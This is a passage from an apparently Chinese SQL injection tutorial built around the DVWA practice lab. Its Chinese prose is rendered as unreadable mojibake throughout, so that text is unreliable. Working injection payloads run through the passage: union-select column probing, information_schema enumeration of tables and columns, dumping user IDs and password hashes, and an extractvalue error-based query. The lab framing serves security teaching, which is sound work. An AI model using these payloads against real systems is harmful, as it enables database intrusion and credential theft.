      </tr>
      <tr>
          <td></td>
          <td><code>substring()</code> æˆ– <code>limit</code></td>
          <td>é€šç”¨</td>
          <td>æˆªå–å­—ç¬¦ä¸²æˆ–æŒ‰è¡Œè¿”å›ã€‚ä¸»è¦ç”¨äºç›²æ³¨ï¼Œé€ä¸ªå­—ç¬¦æˆ–é€è¡ŒçŒœè§£æ•°æ®</td>
          <td><code>' and substring(database(),1,1)='a' #</code></td>
      </tr>
  </tbody>
</table></div>
<h3 id="1åˆ¤æ–­æ³¨å…¥æ˜¯å­—ç¬¦ç±»å‹oræ•°å­—å‹">1.åˆ¤æ–­æ³¨å…¥æ˜¯å­—ç¬¦ç±»å‹oræ•°å­—å‹
</h3><p><strong><mark>ä¸ºä»€ä¹ˆéœ€è¦åˆ¤æ–­ï¼Ÿå› ä¸ºæ•°å­—å‹ä¸éœ€è¦å•å¼•å·æ¥é—­åˆï¼Œè€Œå­—ç¬¦ä¸²ä¸€èˆ¬éœ€è¦é€šè¿‡å•å¼•å·æ¥é—­åˆ</mark></strong></p>
<p>**æ•°å­—å‹ï¼š**select * from table where id =$idï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è¾“å…¥<code>1 and ...</code> è¿›è¡Œæ‰§è¡Œ:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">from</span> <span style="color:#c678dd">table</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">id</span> <span style="color:#56b6c2">=</span><span style="color:#d19a66">1</span> <span style="color:#c678dd">and</span> ...
</span></span></code></pre></div><p>**å­—ç¬¦å‹ï¼š**select * from table where id=&rsquo;$id&rsquo;æˆ‘ä»¬éœ€è¦è¾“å…¥<code>1' and ... #</code>  ï¼Œé—­åˆå‰åå•å¼•å·</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#56b6c2">*</span> <span style="color:#c678dd">from</span> <span style="color:#c678dd">table</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">id</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;1&#39;</span> <span style="color:#c678dd">and</span> ... <span style="color:#56b6c2">#</span><span style="color:#98c379">&#39;       
</span></span></span></code></pre></div><div class="alert alert-tip">
    <div class="alert-header">
        <span class="alert-icon">
            ğŸ’¡
        </span>
        <span class="alert-title">
            Tip
        </span>
    </div>
    <div class="alert-content">
        <p><strong>&ndash; æ˜¯å®˜æ–¹çš„æ³¨é‡Šï¼Œåé¢å¿…é¡»è·Ÿç©ºæ ¼</strong></p>
<p><strong># æ˜¯mysqlç‰¹æœ‰çš„æ³¨é‡Šï¼Œåé¢æ— éœ€è·Ÿç©ºæ ¼</strong></p>
<p><mark><strong>å¦‚æœç›´æ¥åœ¨urlä¸­æ³¨å…¥è€Œéè¾“å…¥æ¡†ï¼Œéœ€è¦ä½¿ç”¨%23ä»£æ›¿#ï¼Œå› ä¸ºæµè§ˆå™¨ä¼šæŠŠ#åé¢å†…å®¹æˆªæ–­ï¼Œè€Œéç¼–ç </strong></mark></p>
<p><mark><strong>æœ‰çš„ç½‘ç«™ä¼šè¿‡æ»¤ç©ºæ ¼å¯¼è‡´&ndash;æŠ¥é”™ï¼Œè¿™æ—¶å€™å¯ä»¥ä½¿ç”¨&ndash;+ï¼Œç”¨+ä»£æ›¿ç©ºæ ¼</strong></mark></p>
<p><strong>ä»¥ä¸Šæ–¹æ³•ä¸ä¸€å®šå…¨éƒ¨é€‚ç”¨ï¼Œéœ€è¦ç»“åˆå®é™…æƒ…å†µå°è¯•</strong></p></div>
</div>
<p><strong>åŸºäºè¿™ç§æ€è·¯ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿæµ‹è¯•æ³¨å…¥æˆåŠŸï¼Œä½¿å¾—é¡µé¢ä¸å‡ºç°è¯­æ³•æŠ¥é”™ï¼Œé‚£ä¹ˆå°±å¯ä»¥å€Ÿæ­¤åˆ¤æ–­å‡ºç±»å‹ï¼š</strong></p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th style="text-align: left">æµ‹è¯•ç›®çš„</th>
          <th style="text-align: left">æµ‹è¯•Payload</th>
          <th style="text-align: left">é¢„æœŸç»“æœ</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><strong>åˆ¤æ–­æ•°å­—å‹</strong></td>
          <td style="text-align: left"><code>1 and 1=1</code></td>
          <td style="text-align: left">é¡µé¢ <strong>æ­£å¸¸</strong>ï¼Œä¸ <code>?id=1</code> æ—¶ç›¸åŒ</td>
      </tr>
      <tr>
          <td style="text-align: left"></td>
          <td style="text-align: left"><code>1 and 1=2</code></td>
          <td style="text-align: left">é¡µé¢ <strong>å†…å®¹å¼‚å¸¸</strong> (å¦‚å˜ç©º)ï¼Œä½†ä¸æ˜¯ç¨‹åºæˆ–è¯­æ³•æŠ¥é”™</td>
      </tr>
      <tr>
          <td style="text-align: left"><strong>åˆ¤æ–­å­—ç¬¦å‹</strong></td>
          <td style="text-align: left"><code>1' and '1'='1</code></td>
          <td style="text-align: left">é¡µé¢ <strong>æ­£å¸¸</strong>ï¼Œä¸ <code>?id='1'</code> æ—¶ç›¸åŒ</td>
      </tr>
      <tr>
          <td style="text-align: left"></td>
          <td style="text-align: left"><code>1' and '1'='2</code></td>
          <td style="text-align: left">é¡µé¢ <strong>å†…å®¹å¼‚å¸¸</strong> (å¦‚å˜ç©º)ï¼Œä½†ä¸æ˜¯ç¨‹åºæˆ–è¯­æ³•æŠ¥é”™</td>
      </tr>
  </tbody>
</table></div>
<p><strong>åˆ†åˆ«æµ‹è¯•æ˜¯å¦å¯¹åº”çš„ç»“æœ</strong></p>
<div class="alert alert-note">
    <div class="alert-header">
        <span class="alert-icon">
            ğŸ“
        </span>
        <span class="alert-title">
            Note
        </span>
    </div>
    <div class="alert-content">
        <p><strong>è¿˜æœ‰æ›´åŠ ç®€å•ï¼ˆä½†æ˜¯ä¸çŸ¥é“æ˜¯å¦ä¸€å®šæœ‰æ•ˆçš„æ–¹æ³•ï¼‰ï¼š</strong></p>
<p><strong>è¾“å…¥<code>2-1</code>ï¼Œå¦‚æœæ˜¯æ•°å­—å‹ï¼Œå°±ä¼šæ‰§è¡Œ<code>2-1</code>è¿ç®—ï¼Œ<code>id=1</code>ï¼›å¦‚æœæ˜¯å­—ç¬¦å‹ï¼Œå°±ä¼šæ˜¯<code>id=2</code></strong></p>
<p><strong>å¯ä»¥æ„é€ ä¸€ä¸ª<code>m-n</code>ï¼Œ<code>m</code>æ˜¯ä¸å­˜åœ¨çš„<code>id</code>ï¼Œä½†<code>m-n</code>ç»“æœæ˜¯å­˜åœ¨çš„<code>id</code>ï¼Œä¾æ®ç»“æœæ¥åˆ¤æ–­æ˜¯å­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹</strong></p>
<p><strong>è¿™ä¸€ç‚¹åœ¨ç›²æ³¨æ—¶æ¯”è¾ƒæ–¹ä¾¿</strong></p></div>
</div>
<p>é€šè¿‡ä»¥ä¸Šæµ‹è¯•ï¼Œæˆ‘ä»¬çŸ¥é“äº†ç°åœ¨DVWAçš„æ³¨å…¥ç±»å‹æ˜¯å­—ç¬¦å‹</p>
<p><span style="color:#fab920;font-size:15px"><strong>å½“ç„¶ï¼Œåœ¨å†™é¢˜çš„æ—¶å€™å¾ˆæœ‰å¯èƒ½ä½ ä¸€ä¸ªä¹Ÿè¯•ä¸å‡ºæ¥ï¼Œå› ä¸ºå®ƒæ˜¯è¢«<code>('')</code>æˆ–è€…<code>&quot;&quot;</code>åŒ…è£¹çš„ï¼Œè¿™å°±éœ€è¦ä½ å‡­æ„Ÿè§‰è¯•äº†</strong></span></p>
<p><span style="color:#fab920;font-size:15px"><strong>ä¸è¿‡åœ¨æ­¤ä¹‹å‰ï¼Œå…ˆæ£€æŸ¥ä¸€ä¸‹ä½ ä¹‹å‰çš„è¯­å¥æœ‰æ²¡æœ‰å†™å¯¹å§~</strong></span></p>
<h3 id="2çŒœæµ‹sqlæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°åˆ—æ•°">2.çŒœæµ‹SQLæŸ¥è¯¢è¯­å¥ä¸­çš„å­—æ®µæ•°ï¼ˆåˆ—æ•°ï¼‰
</h3><p><strong>ä»1å¼€å§‹ï¼Œä½¿ç”¨order byè¯­å¥æŒ‡å®šæŸ¥è¯¢ç»“æœä¾ç…§ç¬¬nåˆ—æ’åºï¼Œå¦‚æœæŠ¥é”™ï¼Œè¯´æ˜ä¸å­˜åœ¨è¯¥è¡Œåˆ—</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; or 1=1 order by 1 #   
</span></span><span style="display:flex;"><span>1&#39; or 1=1 order by 2 #  
</span></span><span style="display:flex;"><span>1&#39; or 1=1 order by 3 #      //æŠ¥é”™äº†
</span></span></code></pre></div><p>order by 3çš„æ—¶å€™æŠ¥é”™ï¼Œè¯´æ˜å½“å‰æŸ¥è¯¢çš„è¡¨ä¸­åªæœ‰2åˆ—</p>
<div class="alert alert-tip">
    <div class="alert-header">
        <span class="alert-icon">
            ğŸ’¡
        </span>
        <span class="alert-title">
            Tip
        </span>
    </div>
    <div class="alert-content">
        <p><strong><code>and</code>ï¼šå¦‚æœandå‰ä¸ºçœŸï¼Œæ‰§è¡Œåé¢å†…å®¹</strong></p>
<p><strong><code>or</code>ï¼šå¦‚æœå‰é¢ä¸ºå‡ï¼Œæ‰æ‰§è¡Œåé¢å†…å®¹</strong></p></div>
</div>
<h3 id="3ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº">3.ç¡®å®šæ˜¾ç¤ºçš„å­—æ®µé¡ºåº
</h3><p><strong>è™½ç„¶æˆ‘ä»¬çŸ¥é“äº†å­—æ®µæ•°ï¼Œä½†å¾ˆå¯èƒ½è¿™äº›å­—æ®µä¸æ˜¯éƒ½æ˜¾ç¤ºåœ¨ç½‘é¡µå‰ç«¯çš„</strong></p>
<p>å‡å¦‚å…¶ä¸­æŸäº›å­—æ®µçš„æŸ¥è¯¢ç»“æœæ˜¯ä¼šè¿”å›åˆ°å‰ç«¯çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±éœ€è¦çŸ¥é“è¿™äº›å­—æ®µä¸­å“ªäº›ç»“æœä¼šå›æ˜¾ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è¾“å…¥æŸ¥è¯¢å­—æ®µè¿›è¡ŒæŸ¥è¯¢ï¼Œè¯­å¥ä¼šéå¸¸å†—é•¿ï¼Œè€Œä¸”å¾ˆå¯èƒ½è¿˜éœ€è¦åšå¾ˆå¤šæ¬¡æµ‹è¯•</p>
<p><strong>è¿™æ—¶å€™æˆ‘ä»¬åˆ©ç”¨ä¸€ä¸ªç®€å•çš„è¯­å¥ï¼šselect 1,2,3ï¼Œæ ¹æ®æ˜¾ç¤ºåœ¨é¡µé¢ä¸Šçš„æ•°å­—å°±å¯ä»¥çŸ¥é“å›æ˜¾ä½ç½®ï¼ˆsqlç‰¹æ€§ï¼‰</strong></p>
<p>ä¹‹åï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠè¿™ä¸ªæ•°å­—æ”¹æˆæˆ‘ä»¬æƒ³æŸ¥è¯¢çš„å†…å®¹ï¼ˆå¦‚id,passwordï¼‰ï¼Œå°±ä¼šåœ¨çª—å£æ˜¾ç¤ºæˆ‘ä»¬æƒ³è¦çš„ç»“æœ</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,2 #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250626115719525" href="http://picture.928330.xyz/typora/image-20250626115719525.png">
<img src="http://picture.928330.xyz/typora/image-20250626115719525.png" alt="image-20250626115719525"  />
</a>
</div>
</p>
<p>è¿™æ ·å°±ç¡®å®šäº†ç½‘ç«™æ‰§è¡Œçš„SQLè¯­å¥ä¸ºï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#c678dd">select</span> <span style="color:#e06c75">Firstname</span>,<span style="color:#e06c75">Surname</span> <span style="color:#c678dd">from</span> <span style="color:#e06c75">xx</span> <span style="color:#c678dd">where</span> <span style="color:#e06c75">ID</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#39;id&#39;</span>
</span></span></code></pre></div><blockquote>
<p><strong>ä»è¿‡ç¨‹ä¸­ä¹Ÿä¸éš¾çœ‹å‡ºï¼Œå…¶å®ç¡®å®šå­—æ®µåˆ—æ•°å’Œæ˜¾ç¤ºé¡ºåºå¯ä»¥ä¸€èµ·åš</strong>
<strong>ä»union select 1å¼€å§‹ï¼Œä¸€ç›´å¢åŠ selectåçš„ä½æ•°ï¼Œç›´åˆ°æŠ¥é”™ä¸ºæ­¢</strong></p>
</blockquote>
<h3 id="4è·å–å½“å‰æ•°æ®åº“">4.è·å–å½“å‰æ•°æ®åº“
</h3><p>çŸ¥é“äº†å›æ˜¾ä½ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠå›æ˜¾ä½æ›¿æ¢æˆæƒ³è¦çš„æ•°æ®</p>
<p><strong><mark>è¿™é‡Œä¸€å®šè¦å†™å…¨ï¼Œæœ‰å¤šå°‘å­—æ®µï¼Œselectåé¢å°±è¦æœ‰å¤šå°‘ç›¸åº”çš„å­—æ®µ</mark></strong>ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,database() #
</span></span></code></pre></div><p><strong><code>database()</code> æ˜¯mysqlå†…ç½®å‡½æ•°ï¼Œå½“æ•°æ®åº“æ‰§è¡Œåˆ°å®ƒæ—¶ï¼Œä¼šå°†å…¶æ›¿æ¢ä¸ºå½“å‰æ­£åœ¨ä½¿ç”¨çš„æ•°æ®åº“çš„åç§°</strong></p>
<p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250626135800624" href="http://picture.928330.xyz/typora/image-20250626135800624.png">
<img src="http://picture.928330.xyz/typora/image-20250626135800624.png" alt="image-20250626135800624"  />
</a>
</div>
</p>
<p>äºæ˜¯ï¼Œæˆ‘ä»¬å°±çŸ¥é“äº†å½“å‰æ•°æ®åº“åç§°ä¸º<code>dvwa</code></p>
<h3 id="5è·å–æ•°æ®åº“ä¸­çš„è¡¨">5.è·å–æ•°æ®åº“ä¸­çš„è¡¨
</h3><p><strong>information_schema.tablesè¡¨å­˜å‚¨äº†æ•°æ®è¡¨çš„å…ƒæ•°æ®ä¿¡æ¯ï¼š</strong></p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th>å­—æ®µå (Field Name)</th>
          <th>æè¿° (Description)</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><code>table_schema</code></td>
          <td>è®°å½•è¯¥è¡¨æ‰€åœ¨çš„æ•°æ®åº“çš„åç§°</td>
      </tr>
      <tr>
          <td><code>table_name</code></td>
          <td>è®°å½•æ•°æ®è¡¨çš„åç§°</td>
      </tr>
      <tr>
          <td><code>engine</code></td>
          <td>è®°å½•è¯¥è¡¨ä½¿ç”¨çš„å­˜å‚¨å¼•æ“ï¼Œä¾‹å¦‚ <code>InnoDB</code>, <code>MyISAM</code></td>
      </tr>
      <tr>
          <td><code>table_rows</code></td>
          <td>å…³äºè¡¨ä¸­æ€»è¡Œæ•°çš„ä¸€ä¸ªç²—ç•¥ä¼°è®¡å€¼</td>
      </tr>
      <tr>
          <td><code>data_length</code></td>
          <td>è®°å½•æ•°æ®è¡¨æœ¬èº«çš„å¤§å°ï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰</td>
      </tr>
      <tr>
          <td><code>index_length</code></td>
          <td>è®°å½•æ•°æ®è¡¨ç´¢å¼•çš„å¤§å°ï¼ˆå•ä½ï¼šå­—èŠ‚ï¼‰</td>
      </tr>
      <tr>
          <td><code>row_format</code></td>
          <td>è®°å½•è¡Œçš„æ ¼å¼ï¼Œä¾‹å¦‚ <code>Dynamic</code> æˆ– <code>Compressed</code>ï¼Œå¯ç”¨äºåˆ¤æ–­è¡¨æ˜¯å¦è¢«å‹ç¼©</td>
      </tr>
  </tbody>
</table></div>
<p>æˆ‘ä»¬å°±å¯ä»¥ä»ä¸­å¾—åˆ°æƒ³è¦çš„ä¿¡æ¯ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250626142534142" href="http://picture.928330.xyz/typora/image-20250626142534142.png">
<img src="http://picture.928330.xyz/typora/image-20250626142534142.png" alt="image-20250626142534142"  />
</a>
</div>
</p>
<p>ä¸Šé¢çš„è¯­å¥æ•ˆæœç­‰åŒäºä¸‹é¢çš„è¯­å¥ï¼Œåªä¸è¿‡ä½¿ç”¨äº†<code>group_concat()</code>ï¼Œè®©è¾“å‡ºçš„å†…å®¹æ‹¼æˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,table_name from information_schema.tables where table_schema=&#39;dvwa&#39; #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250626142649062" href="http://picture.928330.xyz/typora/image-20250626142649062.png">
<img src="http://picture.928330.xyz/typora/image-20250626142649062.png" alt="image-20250626142649062"  />
</a>
</div>
</p>
<p>è¿™æ ·å°±çŸ¥é“äº†dvwaé‡Œé¢ä¸€å…±æœ‰ä¸¤ä¸ªè¡¨ï¼Œåˆ†åˆ«ä¸ºguestbookå’Œusers</p>
<h3 id="6è·å–è¡¨ä¸­çš„å­—æ®µå">6.è·å–è¡¨ä¸­çš„å­—æ®µå
</h3><p><strong>information_schema.columnsè¡¨å­˜å‚¨äº†æ‰€æœ‰è¡¨æ‰€æœ‰åˆ—çš„å…ƒæ•°æ®ä¿¡æ¯ï¼š</strong></p>
<div class="table-wrapper"><table>
  <thead>
      <tr>
          <th style="text-align: left">å­—æ®µå</th>
          <th style="text-align: left">æè¿°</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td style="text-align: left"><code>COLUMN_NAME</code></td>
          <td style="text-align: left">è®°å½•åˆ—çš„åç§°</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>TABLE_NAME</code></td>
          <td style="text-align: left">è®°å½•è¯¥åˆ—æ‰€å±çš„æ•°æ®è¡¨çš„åç§°</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>TABLE_SCHEMA</code></td>
          <td style="text-align: left">è®°å½•è¯¥åˆ—æ‰€å±çš„æ•°æ®åº“çš„åç§°</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>ORDINAL_POSITION</code></td>
          <td style="text-align: left">è®°å½•è¯¥åˆ—åœ¨è¡¨ä¸­çš„ä½ç½®é¡ºåºï¼ˆä¸€ä¸ªä»1å¼€å§‹çš„æ•°å­—ï¼‰</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>DATA_TYPE</code></td>
          <td style="text-align: left">è®°å½•è¯¥åˆ—çš„æ•°æ®ç±»å‹ï¼Œä¾‹å¦‚ <code>varchar</code>, <code>int</code>, <code>text</code> ç­‰</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>COLUMN_KEY</code></td>
          <td style="text-align: left">è®°å½•è¯¥åˆ—æ˜¯å¦ä¸ºé”®ï¼ˆç´¢å¼•ï¼‰ã€‚<code>PRI</code> ä»£è¡¨ä¸»é”®, <code>UNI</code> ä»£è¡¨å”¯ä¸€é”®, <code>MUL</code> ä»£è¡¨å¯é‡å¤çš„ç´¢å¼•</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>COLUMN_DEFAULT</code></td>
          <td style="text-align: left">è®°å½•è¯¥åˆ—çš„é»˜è®¤å€¼ï¼ˆå¦‚æœè®¾ç½®äº†ï¼‰</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>IS_NULLABLE</code></td>
          <td style="text-align: left">è®°å½•è¯¥åˆ—æ˜¯å¦å…è®¸ä¸º <code>NULL</code> å€¼ (<code>YES</code> æˆ– <code>NO</code>)ã€‚</td>
      </tr>
      <tr>
          <td style="text-align: left"><code>CHARACTER_MAXIMUM_LENGTH</code></td>
          <td style="text-align: left">è®°å½•å­—ç¬¦ä¸²ç±»å‹åˆ—çš„æœ€å¤§é•¿åº¦ã€‚</td>
      </tr>
  </tbody>
</table></div>
<p>åŒæ ·å€Ÿæ­¤è·å–usersè¡¨çš„å­—æ®µï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()#
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250706113907039" href="http://picture.928330.xyz/typora/image-20250706113907039.png">
<img src="http://picture.928330.xyz/typora/image-20250706113907039.png" alt="image-20250706113907039"  />
</a>
</div>
</p>
<p>è¿™æ ·å°±å¾—åˆ°äº†usersè¡¨çš„æ‰€æœ‰çš„åˆ—åç§°</p>
<p><strong>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œé™¤äº†æŒ‡å®šè¡¨åä¹‹å¤–ï¼Œè¿˜è¦æŒ‡å®šæ•°æ®åº“åï¼Œå¦åˆ™å°±ä¼šå‡ºç°å¾ˆå¤šä¸å±äºè¿™ä¸ªè¡¨çš„åˆ—åï¼š</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250626144509634" href="http://picture.928330.xyz/typora/image-20250626144509634.png">
<img src="http://picture.928330.xyz/typora/image-20250626144509634.png" alt="image-20250626144509634"  />
</a>
</div>
</p>
<h3 id="7è·å–å­—æ®µä¿¡æ¯">7.è·å–å­—æ®µä¿¡æ¯
</h3><p><strong>çŸ¥é“äº†è¡¨åå’Œåˆ—åï¼Œå°±èƒ½è½»æ¾è·å–å¯¹åº”ä¿¡æ¯äº†</strong></p>
<p>æ¯”å¦‚æˆ‘æƒ³è·å–æ‰€æœ‰ç”¨æˆ·çš„idåç§°å’Œå¯¹åº”å¯†ç ï¼š</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select group_concat(user_id,first_name),group_concat(password) from users #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250626145455797" href="http://picture.928330.xyz/typora/image-20250626145455797.png">
<img src="http://picture.928330.xyz/typora/image-20250626145455797.png" alt="image-20250626145455797"  />
</a>
</div>
</p>
<p>æˆ‘ä»¬åœ¨è¿™é‡Œä½¿ç”¨group_concatæ‹¼æ¥äº†ä¸¤ç»„å­—ç¬¦ä¸²ï¼Œå› ä¸ºselectè¾“å‡ºçš„æ•°é‡å¿…é¡»ä¸å­—æ®µæ•°ä¸€è‡´ï¼Œè¿™é‡Œæ˜¯2</p>
<h3 id="8é€è¡Œè·å–ä¿¡æ¯">8.é€è¡Œè·å–ä¿¡æ¯
</h3><p><strong>ä¹¦æ¥ä¸Šæ–‡ï¼Œå¦‚æœæˆ‘åªæƒ³è¦æ˜¾ç¤ºæŸä¸€æ¡ä¿¡æ¯ï¼Œå°±å¯ä»¥åœ¨æœ«å°¾åŠ ä¸Š<code>limit m,n</code></strong></p>
<p><strong>æ„æ€æ˜¯ä»ç¬¬mæ¡æ•°æ®å¼€å§‹ï¼Œæ˜¾ç¤ºåŒ…æ‹¬næ¡æ•°æ®ï¼Œæ¯”å¦‚<code>limit 0,1</code>ï¼Œå°±æ˜¯åªæ˜¾ç¤ºç¬¬1æ¡æ•°æ®ï¼ˆæ•°æ®ä»0å¼€å§‹å­˜å‚¨ï¼‰</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; limit 1,1 #
</span></span></code></pre></div><p>
<div class="post-img-view">
<a data-fancybox="gallery" data-caption="image-20250627113327247" href="http://picture.928330.xyz/typora/image-20250627113327247.png">
<img src="http://picture.928330.xyz/typora/image-20250627113327247.png" alt="image-20250627113327247"  />
</a>
</div>
</p>
<p>è¿™é‡Œä½¿ç”¨<code>limit1,1</code>ï¼Œå°±åªæ˜¾ç¤ºäº†ç¬¬äºŒæ¡æ•°æ®</p>
<h2 id="2-æŠ¥é”™æ³¨å…¥">#2 æŠ¥é”™æ³¨å…¥
</h2><p>å¦‚æœunionè¢«è¿‡æ»¤ï¼Œæˆ–è€…é¡µé¢æ²¡æœ‰å›æ˜¾ä½†SQLè¯­å¥æ‰§è¡Œå¯ä»¥è¾“å‡ºé”™è¯¯ä¿¡æ¯ï¼Œå°±å¯ä»¥ä½¿ç”¨åŸºäºæŠ¥é”™çš„æ³¨å…¥æ”»å‡»</p>
<p>æŠ¥é”™æ³¨å…¥å°±æ˜¯äººä¸ºåˆ¶é€ é”™è¯¯æ¡ä»¶ï¼Œè®©æŸ¥è¯¢ç»“æœåœ¨æŠ¥é”™ä¿¡æ¯ä¸­è¢«â€œå¸¦å‡ºâ€</p>
<p><strong><mark>æŠ¥é”™æ³¨å…¥æœ€å¥½ä½¿ç”¨andï¼Œå› ä¸ºæˆ‘ä»¬çš„ç›®çš„æ˜¯ä¿è¯è¯­å¥æ‰§è¡Œé”™è¯¯ï¼Œäº§ç”Ÿé”™è¯¯ä¿¡æ¯</mark></strong></p>
<h3 id="å¸¸ç”¨å‡½æ•°-1">å¸¸ç”¨å‡½æ•°
</h3><p>åœ¨mysqlé«˜ç‰ˆæœ¬**ï¼ˆå¤§äº5.1ç‰ˆæœ¬ï¼‰**ä¸­æ·»åŠ äº†å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„å‡½æ•°<code>updatexml()</code>å’Œ<code>extractvalue()</code></p>
<p>å½“è¿™ä¸¤ä¸ªå‡½æ•°åœ¨æ‰§è¡Œæ—¶ï¼Œå¦‚æœå‡ºç°xmlæ–‡æ¡£è·¯å¾„é”™è¯¯å°±ä¼šäº§ç”ŸæŠ¥é”™</p>
<h4 id="extractvalue-xml_document-xpath_string">extractvalue (XML_document, XPath_string)
</h4><ul>
<li>
<p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼š<code>XML_document</code> æ˜¯ç›®æ ‡XMLæ–‡æ¡£</p>
</li>
<li>
<p>ç¬¬äºŒä¸ªå‚æ•°ï¼š<code>XPath_string</code> <strong>æ˜¯è¯¥XMLæ–‡æ¡£çš„è·¯å¾„ï¼Œå¦‚æœå†™å…¥å…¶ä»–æ ¼å¼å°±ä¼šæŠ¥é”™ï¼Œå¹¶ä¸”è¿”å›éæ³•æ ¼å¼çš„å†…å®¹</strong></p>
</li>
</ul>
<p><mark><strong>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨concatæ‹¼æ¥ä»»æ„éæ³•å­—ç¬¦å’ŒæŸ¥è¯¢è¯­å¥/å‡½æ•°ï¼Œè¿™æ ·æƒ³è¦å¾—åˆ°çš„å†…å®¹å°±ä¼šéšç€æŠ¥é”™ä¸€å¹¶å›æ˜¾ï¼š</strong></mark></p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>1&#39; and (extractvalue(1,concat(0x7e,(select database()),0x7e)))#
</span></span></code></pre></div><p>0x7eæ˜¯~çš„åå…­è¿›åˆ¶ï¼Œè€Œ~ä¸å±äºxpathè¯­æ³•æ ¼å¼ï¼Œå› æ­¤ä¼šæŠ¥å‡ºxpathè¯­æ³•é”™è¯¯ï¼š</p>
